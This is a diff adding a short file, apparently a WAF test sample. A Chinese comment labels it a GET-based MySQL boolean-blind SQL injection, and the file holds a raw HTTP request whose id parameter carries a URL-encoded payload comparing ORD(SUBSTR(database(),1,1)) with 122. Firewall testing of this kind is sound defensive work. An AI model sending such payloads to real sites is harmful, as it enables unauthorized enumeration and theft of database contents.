@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_布尔注入-06506247
+# 基于布尔注入,该SQL 注入语句的目的是查询数据库中的数据，并通过 ORD() 函数和 SUBSTR() 函数来实现某种条件筛选。其中，攻击者通过 substr() 函数从数据库 () 函数中提取一个字符，然后使用 ORD() 函数获取该字符的 ASCII 码，并与 122 进行比较。这里的 122 是字符'z'的 ASCII 码，如果查询结果满足该条件，则说明数据库名称的第一个字符小于'z'。
+GET /?id=1%20and%20ord%28substr%28database%28%29%2C1%2C1%29%29%20%3C%20122%20&bid=hd_tag_m8mv24e1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24e1
+RM-PRO-Token: 8f665b1e51b2c61025aac87371f6800e
+RM-PRO-Time: 1742808377932
+User-Agent: curl/7.83.1
+
